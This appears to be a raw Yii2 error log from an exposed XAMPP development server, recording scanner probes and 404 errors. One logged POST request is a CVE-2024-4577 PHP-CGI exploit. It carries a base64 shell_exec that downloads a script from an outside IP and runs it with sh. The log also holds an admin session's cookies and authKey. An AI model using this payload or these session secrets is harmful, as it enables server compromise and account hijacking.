    'USERDOMAIN_ROAMINGPROFILE' => 'DESKTOP-KU4M9D4'
    'USERNAME' => 'BlackOwl'
    'USERPROFILE' => 'C:\\Users\\BlackOwl'
    'WINDIR' => 'C:\\Windows'
    'WSLENV' => 'HOSTTERM::HOSTLANG'
    '_' => '/usr/bin/winpty'
    'PHP_SELF' => 'yii'
    'SCRIPT_NAME' => 'yii'
    'SCRIPT_FILENAME' => 'yii'
    'PATH_TRANSLATED' => 'yii'
    'DOCUMENT_ROOT' => ''
    'REQUEST_TIME_FLOAT' => 1769622638.7089
    'REQUEST_TIME' => 1769622638
    'argv' => [
        0 => 'yii'
        1 => 'route-diagnose'
    ]
    'argc' => 2
]
2026-01-28 19:19:20 [-][-][-][error][yii\console\UnknownCommandException] yii\base\InvalidRouteException: Unable to resolve the request: route-diagnose/deep-diagnose in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Controller.php:168
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\console\Controller.php(186): yii\base\Controller->runAction('deep-diagnose', Array)
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php(554): yii\console\Controller->runAction('deep-diagnose', Array)
#2 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\console\Application.php(183): yii\base\Module->runAction('route-diagnose/...', Array)
#3 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\console\Application.php(150): yii\console\Application->runAction('route-diagnose/...', Array)
#4 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\console\Application->handleRequest(Object(yii\console\Request))
#5 C:\xampp\htdocs\planealo_desarrollo\yii(20): yii\base\Application->run()
#6 {main}

Next yii\console\UnknownCommandException: Unknown command "route-diagnose/deep-diagnose". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\console\Application.php:186
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\console\Application.php(150): yii\console\Application->runAction('route-diagnose/...', Array)
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\console\Application->handleRequest(Object(yii\console\Request))
#2 C:\xampp\htdocs\planealo_desarrollo\yii(20): yii\base\Application->run()
#3 {main}
2026-01-28 19:19:20 [-][-][-][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = []

$_SERVER = [
    'ACLOCAL_PATH' => '/mingw64/share/aclocal:/usr/share/aclocal'
    'ALLUSERSPROFILE' => 'C:\\ProgramData'
    'APPDATA' => 'C:\\Users\\BlackOwl\\AppData\\Roaming'
    'COMMONPROGRAMFILES' => 'C:\\Program Files\\Common Files'
    'CommonProgramFiles(x86)' => 'C:\\Program Files (x86)\\Common Files'
    'CommonProgramW6432' => 'C:\\Program Files\\Common Files'
    'COMPUTERNAME' => 'DESKTOP-KU4M9D4'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'CONFIG_SITE' => '/etc/config.site'
    'DISPLAY' => 'needs-to-be-defined'
    'EXEPATH' => 'C:\\Program Files\\Git'
    'GIT_LFS_PATH' => 'C:\\Program Files\\Git LFS'
    'HOME' => 'C:\\Users\\BlackOwl'
    'HOMEDRIVE' => 'C:'
    'HOMEPATH' => '\\Users\\BlackOwl'
    'HOSTLANG' => 'es_ES.UTF-8'
    'HOSTNAME' => 'DESKTOP-KU4M9D4'
    'HOSTTERM' => 'xterm'
    'INFOPATH' => '/mingw64/local/info:/mingw64/share/info:/usr/local/info:/usr/share/info:/usr/info:/share/info'
    'LC_CTYPE' => 'es_ES.UTF-8'
    'LOCALAPPDATA' => 'C:\\Users\\BlackOwl\\AppData\\Local'
    'LOGONSERVER' => '\\\\DESKTOP-KU4M9D4'
    'MANPATH' => '/mingw64/local/man:/mingw64/share/man:/usr/local/man:/usr/share/man:/usr/man:/share/man'
    'MINGW_CHOST' => 'x86_64-w64-mingw32'
    'MINGW_PACKAGE_PREFIX' => 'mingw-w64-x86_64'
    'MINGW_PREFIX' => '/mingw64'
    'MSYSTEM' => 'MINGW64'
    'MSYSTEM_CARCH' => 'x86_64'
    'MSYSTEM_CHOST' => 'x86_64-w64-mingw32'
    'MSYSTEM_PREFIX' => '/mingw64'
    'NUMBER_OF_PROCESSORS' => '4'
    'OLDPWD' => '/c/xampp/htdocs'
    'OneDrive' => 'C:\\Users\\BlackOwl\\OneDrive'
    'ORIGINAL_PATH' => 'C:\\Program Files\\Git\\mingw64\\bin;C:\\Program Files\\Git\\usr\\bin;C:\\Users\\BlackOwl\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'ORIGINAL_TEMP' => '/tmp'
    'ORIGINAL_TMP' => '/tmp'
    'OS' => 'Windows_NT'
    'PATH' => 'C:\\Users\\BlackOwl\\bin;C:\\Program Files\\Git\\mingw64\\bin;C:\\Program Files\\Git\\usr\\local\\bin;C:\\Program Files\\Git\\usr\\bin;C:\\Program Files\\Git\\usr\\bin;C:\\Program Files\\Git\\mingw64\\bin;C:\\Program Files\\Git\\usr\\bin;C:\\Users\\BlackOwl\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin;C:\\Program Files\\Git\\usr\\bin\\vendor_perl;C:\\Program Files\\Git\\usr\\bin\\core_perl'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'PKG_CONFIG_PATH' => '/mingw64/lib/pkgconfig:/mingw64/share/pkgconfig'
    'PKG_CONFIG_SYSTEM_INCLUDE_PATH' => '/mingw64/include'
    'PKG_CONFIG_SYSTEM_LIBRARY_PATH' => '/mingw64/lib'
    'PLINK_PROTOCOL' => 'ssh'
    'PROCESSOR_ARCHITECTURE' => 'AMD64'
    'PROCESSOR_IDENTIFIER' => 'Intel64 Family 6 Model 78 Stepping 3, GenuineIntel'
    'PROCESSOR_LEVEL' => '6'
    'PROCESSOR_REVISION' => '4e03'
    'ProgramData' => 'C:\\ProgramData'
    'PROGRAMFILES' => 'C:\\Program Files'
    'ProgramFiles(x86)' => 'C:\\Program Files (x86)'
    'ProgramW6432' => 'C:\\Program Files'
    'PS1' => '\\[\\033]0;$TITLEPREFIX:$PWD\\007\\]\\n\\[\\033[32m\\]\\u@\\h \\[\\033[35m\\]$MSYSTEM \\[\\033[33m\\]\\w\\[\\033[36m\\]`__git_ps1`\\[\\033[0m\\]\\n$ '
    'PSModulePath' => 'C:\\Program Files\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules'
    'PUBLIC' => 'C:\\Users\\Public'
    'PWD' => '/c/xampp/htdocs/planealo_desarrollo'
    'SESSIONNAME' => 'Console'
    'SHELL' => 'C:\\Program Files\\Git\\usr\\bin\\bash.exe'
    'SHLVL' => '1'
    'SSH_ASKPASS' => '/mingw64/bin/git-askpass.exe'
    'SYSTEMDRIVE' => 'C:'
    'SYSTEMROOT' => 'C:\\Windows'
    'TEMP' => 'C:\\Users\\BlackOwl\\AppData\\Local\\Temp'
    'TERM_PROGRAM' => 'mintty'
    'TERM_PROGRAM_VERSION' => '3.7.9'
    'TMP' => 'C:\\Users\\BlackOwl\\AppData\\Local\\Temp'
    'TMPDIR' => 'C:\\Users\\BlackOwl\\AppData\\Local\\Temp'
    'USERDOMAIN' => 'DESKTOP-KU4M9D4'
    'USERDOMAIN_ROAMINGPROFILE' => 'DESKTOP-KU4M9D4'
    'USERNAME' => 'BlackOwl'
    'USERPROFILE' => 'C:\\Users\\BlackOwl'
    'WINDIR' => 'C:\\Windows'
    'WSLENV' => 'HOSTTERM::HOSTLANG'
    '_' => '/usr/bin/winpty'
    'PHP_SELF' => 'yii'
    'SCRIPT_NAME' => 'yii'
    'SCRIPT_FILENAME' => 'yii'
    'PATH_TRANSLATED' => 'yii'
    'DOCUMENT_ROOT' => ''
    'REQUEST_TIME_FLOAT' => 1769624360.1119
    'REQUEST_TIME' => 1769624360
    'argv' => [
        0 => 'yii'
        1 => 'route-diagnose/deep-diagnose'
    ]
    'argc' => 2
]
2026-01-28 14:26:53 [103.70.167.46][-][mal14o7hqlp4g0cs61n5v0dkre][error][yii\web\HttpException:404] yii\base\InvalidRouteException: Unable to resolve the request "GponForm/diag_Form". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php:563
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('GponForm/diag_F...', Array)
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#2 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#3 {main}

Next yii\web\NotFoundHttpException: Página no encontrada. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php:124
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#1 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#2 {main}
2026-01-28 14:26:53 [103.70.167.46][-][mal14o7hqlp4g0cs61n5v0dkre][info][application] $_GET = [
    'images/' => ''
]

$_POST = []

$_FILES = []

$_COOKIE = []

$_SESSION = [
    '__flash' => []
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => '127.0.0.1:80'
    'HTTP_CONNECTION' => 'keep-alive'
    'HTTP_ACCEPT_ENCODING' => 'gzip, deflate'
    'HTTP_ACCEPT' => '*/*'
    'HTTP_USER_AGENT' => 'Hello, World'
    'CONTENT_LENGTH' => '118'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 127.0.0.1 Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => '127.0.0.1'
    'SERVER_ADDR' => '192.168.1.120'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '103.70.167.46'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '55829'
    'REDIRECT_URL' => '/GponForm/diag_Form'
    'REDIRECT_QUERY_STRING' => 'images/'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'POST'
    'QUERY_STRING' => 'images/'
    'REQUEST_URI' => '/GponForm/diag_Form?images/'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769624813.5768
    'REQUEST_TIME' => 1769624813
]
2026-01-28 14:37:00 [20.102.117.125][-][7ooucn6vlgavjrielnc1qqp29g][error][yii\web\HttpException:404] yii\base\InvalidRouteException: Unable to resolve the request "hudson". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php:563
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('hudson', Array)
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#2 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#3 {main}

Next yii\web\NotFoundHttpException: Página no encontrada. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php:124
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#1 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#2 {main}
2026-01-28 14:37:00 [20.102.117.125][-][7ooucn6vlgavjrielnc1qqp29g][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = []

$_SESSION = [
    '__flash' => []
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => '201.209.50.227'
    'HTTP_USER_AGENT' => 'Mozilla/5.0 zgrab/0.x'
    'HTTP_ACCEPT' => '*/*'
    'HTTP_ACCEPT_ENCODING' => 'gzip'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 201.209.50.227 Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => '201.209.50.227'
    'SERVER_ADDR' => '192.168.1.120'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '20.102.117.125'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '38302'
    'REDIRECT_URL' => '/hudson'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/hudson'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769625420.3431
    'REQUEST_TIME' => 1769625420
]
2026-01-28 14:40:02 [204.76.203.18][-][5884tc85gt8sujit6qacrt9qpn][error][yii\web\HttpException:404] yii\base\InvalidRouteException: Unable to resolve the request "bin/". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php:563
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('bin/', Array)
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#2 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#3 {main}

Next yii\web\NotFoundHttpException: Página no encontrada. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php:124
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#1 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#2 {main}
2026-01-28 14:40:02 [204.76.203.18][-][5884tc85gt8sujit6qacrt9qpn][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = []

$_SESSION = [
    '__flash' => []
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_HOST' => '201.209.50.227:80'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 201.209.50.227 Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => '201.209.50.227'
    'SERVER_ADDR' => '192.168.1.120'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '204.76.203.18'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '33910'
    'REDIRECT_URL' => '/bin/'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'GET'
    'QUERY_STRING' => ''
    'REQUEST_URI' => '/bin/'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769625602.5103
    'REQUEST_TIME' => 1769625602
]
2026-01-28 15:04:23 [24.84.30.89][-][37vg914ejfa80j3rp5vplbidv0][error][yii\web\HttpException:404] yii\base\InvalidRouteException: Unable to resolve the request "hello.world". in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Module.php:563
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php(112): yii\base\Module->runAction('hello.world', Array)
#1 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#2 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#3 {main}

Next yii\web\NotFoundHttpException: Página no encontrada. in C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\web\Application.php:124
Stack trace:
#0 C:\xampp\htdocs\planealo_desarrollo\vendor\yiisoft\yii2\base\Application.php(391): yii\web\Application->handleRequest(Object(yii\web\Request))
#1 C:\xampp\htdocs\planealo_desarrollo\web\index.php(12): yii\base\Application->run()
#2 {main}
2026-01-28 15:04:23 [24.84.30.89][-][37vg914ejfa80j3rp5vplbidv0][info][application] $_GET = [
    '�d_allow_url_include=1_�d_auto_prepend_file=php://input' => ''
]

$_POST = [
    '<?php_shell_exec(base64_decode(\"KHdnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSAtcU8tIGh0dHBzOi8vMTc4LjE2LjU1LjIyNC9zaCB8fCBjdXJsIC1zayBodHRwczovLzE3OC4xNi41NS4yMjQvc2gpIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw\"));_echo(md5(\"Hello_CVE-2024-4577\"));_?>' => ''
]

$_FILES = []

$_COOKIE = []

$_SESSION = [
    '__flash' => []
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
    'REDIRECT_TMP' => '\\xampp\\tmp'
    'REDIRECT_STATUS' => '200'
    'MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'PHPRC' => '\\xampp\\php'
    'TMP' => '\\xampp\\tmp'
    'HTTP_UPGRADE_INSECURE_REQUESTS' => '1'
    'HTTP_HOST' => '201.209.50.227:80'
    'HTTP_ACCEPT' => '*/*'
    'HTTP_USER_AGENT' => 'libredtail-http'
    'HTTP_CONNECTION' => 'keep-alive'
    'CONTENT_TYPE' => 'application/x-www-form-urlencoded'
    'CONTENT_LENGTH' => '241'
    'PATH' => 'C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\xampp\\php;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files\\Git LFS;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\BlackOwl\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\BlackOwl\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Users\\BlackOwl\\AppData\\Local\\Programs\\Microsoft VS Code\\bin'
    'SystemRoot' => 'C:\\Windows'
    'COMSPEC' => 'C:\\Windows\\system32\\cmd.exe'
    'PATHEXT' => '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC'
    'WINDIR' => 'C:\\Windows'
    'SERVER_SIGNATURE' => '<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 201.209.50.227 Port 80</address>
'
    'SERVER_SOFTWARE' => 'Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25'
    'SERVER_NAME' => '201.209.50.227'
    'SERVER_ADDR' => '192.168.1.120'
    'SERVER_PORT' => '80'
    'REMOTE_ADDR' => '24.84.30.89'
    'DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'REQUEST_SCHEME' => 'http'
    'CONTEXT_PREFIX' => ''
    'CONTEXT_DOCUMENT_ROOT' => 'C:/xampp/htdocs/planealo_desarrollo/web'
    'SERVER_ADMIN' => 'postmaster@localhost'
    'SCRIPT_FILENAME' => 'C:/xampp/htdocs/planealo_desarrollo/web/index.php'
    'REMOTE_PORT' => '40324'
    'REDIRECT_URL' => '/hello.world'
    'REDIRECT_QUERY_STRING' => '%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
    'GATEWAY_INTERFACE' => 'CGI/1.1'
    'SERVER_PROTOCOL' => 'HTTP/1.1'
    'REQUEST_METHOD' => 'POST'
    'QUERY_STRING' => '%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
    'REQUEST_URI' => '/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input'
    'SCRIPT_NAME' => '/index.php'
    'PHP_SELF' => '/index.php'
    'REQUEST_TIME_FLOAT' => 1769627063.392
    'REQUEST_TIME' => 1769627063
]
2026-01-28 15:07:59 [127.0.0.1][1][-][error][mdm\admin\models\Route::getControllerFiles] Unable to find 'app\modules\escuela_club\controllers\ClubRegistroController' in file: C:\xampp\htdocs\planealo_desarrollo/modules/escuela_club/controllers/ClubRegistroController.php. Namespace missing?
    in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\models\Route.php:264
    in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\models\Route.php:221
    in C:\xampp\htdocs\planealo_desarrollo\vendor\mdmsoft\yii2-admin\models\Route.php:212
2026-01-28 15:07:53 [127.0.0.1][1][-][info][application] $_GET = []

$_POST = []

$_FILES = []

$_COOKIE = [
    '_identity' => '9dc3e882c595ff0fa4feeae21489c917fcb86f4f3aef88d6982c5f18402701dea:2:{i:0;s:9:\"_identity\";i:1;s:46:\"[1,\"FCxNRGJia25jro30ecX5r8yVk7nCuaOY\",2592000]\";}'
    '_csrf' => '62eec84fae02f3723f5fd39cc3cad22dcdd04ab316f5139357f9c1e3822a06c1a:2:{i:0;s:5:\"_csrf\";i:1;s:32:\"rbJenndMR37iuhmNYhvcYBeDxQAw2HiZ\";}'
    'PHPSESSID' => '2nreelq6ih9vuja9usa43m96no'
]

$_SESSION = [
    '__flash' => []
    '__id' => 1
    '__authKey' => 'FCxNRGJia25jro30ecX5r8yVk7nCuaOY'
]

$_SERVER = [
    'REDIRECT_MIBDIRS' => 'C:/xampp/php/extras/mibs'
    'REDIRECT_MYSQL_HOME' => '\\xampp\\mysql\\bin'
    'REDIRECT_OPENSSL_CONF' => 'C:/xampp/apache/bin/openssl.cnf'
    'REDIRECT_PHP_PEAR_SYSCONF_DIR' => '\\xampp\\php'
    'REDIRECT_PHPRC' => '\\xampp\\php'
